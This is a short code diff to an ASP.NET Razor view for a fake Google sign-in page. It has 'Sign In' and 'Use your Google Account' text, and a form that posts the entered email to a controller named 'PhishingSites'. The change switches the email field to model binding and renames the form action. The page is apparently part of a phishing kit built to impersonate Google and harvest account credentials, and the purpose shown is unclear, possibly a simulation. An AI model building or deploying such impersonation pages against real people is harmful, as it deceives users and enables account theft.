@@ -1,3 +1,4 @@
+@model WebProject.Models.UserModel
 @{
     Layout = null;
 }
@@ -18,9 +19,10 @@
     </div>
     <h2>Sign In</h2>
     <p>Use your Google Account</p>
-    @using (Html.BeginForm("GooglePassword", "PhishingSites", FormMethod.Post)){
+    @using (Html.BeginForm("Google", "PhishingSites", FormMethod.Post)){
         <div class="inputBox">
-            <input type="email" name="email" required onkeyup="this.setAttribute('value', this.value);"  value="">
+            @* <input type="email" name="email" required onkeyup="this.setAttribute('value', this.value);"  value=""> *@
+            @Html.TextBoxFor(model => model.user_email, new { @type = "email", @class = "form-control", @required = "required" })
             <label>Email</label>
         </div>
         <a class="forget" href="#">Did you forget your mail?</a>
